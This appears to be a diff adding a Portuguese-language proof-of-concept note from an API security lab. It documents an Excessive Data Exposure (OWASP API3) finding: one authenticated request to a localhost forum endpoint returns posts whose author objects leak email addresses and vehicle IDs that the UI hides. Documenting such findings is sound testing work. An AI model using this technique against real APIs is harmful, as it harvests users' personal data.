@@ -1,0 +1,9 @@
+# Excessive Data Exposure (API3) — posts da comunidade vazam dados sensíveis
+# Requisição:
+GET http://localhost:8888/community/api/v2/community/posts/recent  (Authorization: Bearer <atacante>)
+----------------------------------------------------------------
+# Resposta:
+{"posts":[{"id":"a8Uuw9g5zVkYqMjNfYfAkN","title":"Title 3","content":"Hello world 3","author":{"nickname":"Robot","email":"robot001@example.com","vehicleid":"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5","profile_pic_url":"","created_at":"2026-10-20T22:44:02.922Z"},"comments":[],"authorid":3,"CreatedAt":"2026-10-20T22:44:02.922Z"},{"id":"nfmPzohrRoeLxioAJNYURR","title":"Title 2","content":"Hello world 2","author":{"nickname":"Pogba","email":"pogba006@example.com","vehicleid":"cd515c12-0fc1-48ae-8b61-9230b70a845b","profile_pic_url":"","created_at":"2026-10-20T22:44:02.921Z"},"comments":[],"authorid":2,"CreatedAt":"2026-10-20T22:44:02.921Z"},{"id":"qVQC6BdReptTneCNUDC7zH","title":"Title 1","content":"Hello world 1","author":{"nickname":"Adam","email":"adam007@example.com","vehicleid":"f89b5f21-7829-45cb-a650-299a61090378","profile_pic_url":"","created_at":"2026-10-20T22:44:02.911Z"},"comments":[],"authorid":1,"CreatedAt":"2026-10-20T22:44:02.911Z"}],"next_offset":null,"previous_offset":null,"total":3}
+
+----------------------------------------------------------------
+# Prova: cada 'author' expõe 'email' e 'vehicleid' — campos que a UI do fórum não mostra.
